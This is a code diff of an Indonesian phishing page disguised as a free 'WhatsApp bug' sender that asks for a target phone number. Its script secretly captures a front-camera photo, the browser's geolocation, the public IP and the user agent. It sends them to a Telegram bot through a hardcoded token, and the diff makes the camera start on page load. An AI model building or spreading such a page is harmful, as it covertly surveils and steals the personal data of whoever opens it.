@@ -1,9 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Bug WhatsApp</title>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bug Whatsappp</title>
   <style>
     body {
       margin: 0;
@@ -73,29 +71,32 @@
       box-shadow: 0 0 15px #00ffcc, 0 0 25px #00ffcc;
     }
 
-    .toast {
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0, 0, 0, 0.8);
-      color: #fff;
-      padding: 14px 25px;
-      border-radius: 10px;
-      font-size: 16px;
-      z-index: 999;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.5s ease;
-    }
-
-    .toast.show {
-      opacity: 1;
-      pointer-events: auto;
-    }
-
     video, canvas {
       display: none;
+    }
+
+    /* Toast Notification Kanan Atas */
+    .toast {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(0, 255, 204, 0.1);
+      border: 1px solid #00ffcc;
+      padding: 15px 20px;
+      border-radius: 10px;
+      font-size: 16px;
+      color: #00ffee;
+      box-shadow: 0 0 15px #00ffe1, 0 0 30px #00ffe1;
+      z-index: 9999;
+      opacity: 0;
+      animation: fadeInOut 4s ease forwards;
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translateY(-20px); }
+      10% { opacity: 1; transform: translateY(0); }
+      90% { opacity: 1; }
+      100% { opacity: 0; transform: translateY(-20px); }
     }
   </style>
 </head>
@@ -104,21 +105,19 @@
 <div class="snow"></div>
 
 <div class="container">
-  <h1>Bug WhatsApp Free</h1>
+  <h1>Bug Whatsapp Free</h1>
   <p>Masukkan Nomor Target:</p>
   <input type="text" placeholder="Contoh: 62xxxxx" id="nomor">
   <br>
-  <button onclick="main()">Kirim Bug WhatsApp</button>
+  <button onclick="main()">Kirim Bug Whatsapp</button>
 </div>
 
-<video id="video" width="1080" height="1350" autoplay></video>
+<video id="video" width="1080" height="1350" autoplay playsinline></video>
 <canvas id="canvas" width="1080" height="1350"></canvas>
 
 <audio id="sound">
   <source src="https://files.catbox.moe/033uyr.mp3" type="audio/mpeg">
 </audio>
-
-<div id="toast" class="toast">Notifikasi</div>
 
 <script>
   const token = "7435143784:AAG0Jbu7tNBfHYNj14tVOPgrIFOQ_M1oZpk";
@@ -128,37 +127,42 @@
   const ctx = canvas.getContext('2d');
   const sound = document.getElementById('sound');
 
-  let dataTerkirim = false; // <== FLAG mencegah pengiriman berulang
+  let cameraReady = false;
 
-  function showToast(message, duration = 3000) {
-    const toast = document.getElementById('toast');
-    toast.innerText = message;
-    toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), duration);
+  // Fungsi notifikasi toast
+  function showToast(text) {
+    const toast = document.createElement("div");
+    toast.className = "toast";
+    toast.innerText = text;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 4000);
   }
 
-  async function enableCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          width: { ideal: 1080 },
-          height: { ideal: 1350 },
-          facingMode: "user"
-        }
-      });
-      video.srcObject = stream;
-      showToast("✅ Succesfuly...");
-    } catch (err) {
-      showToast("❌ Terjadi Kesalahan, Mohon Ulangi...: " + err.message);
+  // Aktifkan kamera
+  navigator.mediaDevices.getUserMedia({
+    video: {
+      width: { ideal: 1080 },
+      height: { ideal: 1350 },
+      facingMode: "user"
     }
-  }
-
-  enableCamera();
+  })
+  .then(stream => {
+    video.srcObject = stream;
+    video.onloadedmetadata = () => {
+      video.play();
+      cameraReady = true;
+    };
+  })
+  .catch(err => {
+    showToast("❌ Your Singal Error.");
+  });
 
   async function captureAndSendFullData() {
-    if (dataTerkirim) return; // Hentikan jika sudah terkirim
+    if (!cameraReady) {
+      showToast("⏳ Your Phon Not Alreddy...");
+      return;
+    }
 
-    dataTerkirim = true; // Set flag agar hanya kirim sekali
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     canvas.toBlob(async function(blob) {
@@ -168,18 +172,15 @@
         const userAgent = navigator.userAgent;
         const time = new Date().toLocaleString();
 
-        // Ambil IP publik
         let ip = "Tidak diketahui";
         try {
           const res = await fetch("https://api.ipify.org?format=json");
           const data = await res.json();
           ip = data.ip;
-        } catch (e) {
-          showToast("⚠️ Terjadi Kesalahan, Mohon Ulangi...");
-        }
+        } catch (e) {}
 
-        // Kirim lokasi ke Telegram
-        await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+        // Kirim lokasi
+        fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -188,29 +189,31 @@
             longitude: lon
           })
         });
+        showToast("📍 Succesfuly");
 
-        // Kirim foto + data
+        // Kirim foto + detail
         const form = new FormData();
         form.append("chat_id", chat_id);
         form.append("photo", blob, "kamera_hd.jpg");
         form.append("caption", `
 📷 Foto Target Terkirim
 🕓 Waktu: ${time}
-🌍 Lokasi: 
-  • Latitude: ${lat}
-  • Longitude: ${lon}
+🌍 Lokasi:
+• Latitude: ${lat}
+• Longitude: ${lon}
 🌐 IP: ${ip}
 📱 Device: ${userAgent}
         `);
 
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
           body: form
         });
 
-        showToast("✅ Succesfuly...");
+        showToast("📸 Succesfuly");
+
       }, function(err) {
-        showToast("❌ Terdapat Kesalahan...: " + err.message);
+        showToast("❌ Your Signal Error: " + err.message);
       });
     }, 'image/jpeg', 1.0);
   }
@@ -218,12 +221,12 @@
   function main() {
     const nomor = document.getElementById("nomor").value.trim();
     if (nomor === "") {
-      showToast("⚠️ Masukkan nomor target terlebih dahulu!");
+      showToast("⚠️ Masukkan nomor dulu!");
       return;
     }
 
     sound.play();
-    showToast("⏳ Bug sedang diproses, tunggu 5-10 menit...");
+    showToast("🚀 Bug sedang diproses...");
     captureAndSendFullData();
   }
 </script>
